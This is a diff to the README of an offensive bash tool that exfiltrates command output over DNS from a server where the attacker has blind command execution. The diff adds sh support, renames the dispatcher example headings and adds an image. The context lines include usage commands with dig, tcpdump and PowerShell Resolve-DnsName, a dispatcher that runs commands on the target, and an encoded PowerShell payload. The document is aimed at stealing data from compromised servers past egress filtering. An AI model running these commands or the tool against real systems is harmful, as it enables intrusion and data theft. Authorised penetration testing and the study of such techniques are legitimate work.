@@ -1,6 +1,6 @@
 # DNS Data Exfiltration
 
-A bash script that automates the exfiltration of data over dns in case we have a blind command execution on a server where all outbound connections except DNS are blocked. The script currently supports bash and powershell and is compatible with exec style command execution (e.g. java.lang.Runtime.exec).
+A bash script that automates the exfiltration of data over dns in case we have a blind command execution on a server where all outbound connections except DNS are blocked. The script currently supports sh, bash and powershell and is compatible with exec style command execution (e.g. java.lang.Runtime.exec).
 
 For its operations, the script takes as input the command we want to run on the target server and transforms it according to the target shell in order to allow its output to be exfiltrated over DNS. After the command is transformed, it's fed to the "dispatcher". The dispatcher is a program provided by the user and is responsible for taking as input a command and have it executed on the target server by any means necessary (e.g. exploiting a vulnerability). After the command is executed on the target server, it is expected to trigger DNS requests to our DNS name server containing chunks of our data. The script listens for those requests until the output of the user provided command is fully exfiltrated.
 
@@ -27,7 +27,7 @@ powershell -enc UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAkACgAIgB7ADAAfQAuAHsA
 ./dns_data_exfiltration.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret' < <(stdbuf -oL tcpdump --immediate -l -i any udp port 53)
 ```
 
-Contents of dispatcher.sh:
+Contents of local_bash.sh:
 > $@
 
 2. Local testing for powershell with WSL2:
@@ -35,7 +35,7 @@ Contents of dispatcher.sh:
 stdbuf -oL tcpdump --immediate -l -i any udp port 53|./dns_data_exfiltration.sh -w ps -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x dispatcher_examples/local_powershell_wsl2.sh -- 'gci | % {$_.Name}'
 ```
 
-Contents of dispatcher.sh:
+Contents of local_powershell_wsl2.sh:
 > /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe ${@:1}
 
 3. powershell example where we ssh into our NS to get the incoming DNS requests.
@@ -50,6 +50,8 @@ Contents of dispatcher.sh
 ```bash
 dns_data_exfiltration.sh --help
 ```
+
+![op](images/op.gif "bash example")
 
 ### Comments
 Currently the provided command gets executed multiple times on the server until all of its output is extracted. This behavior may cause problems in case that command is not idempotent (functionality or output-wise, e.g. process listing) or is time/resource intensive. 
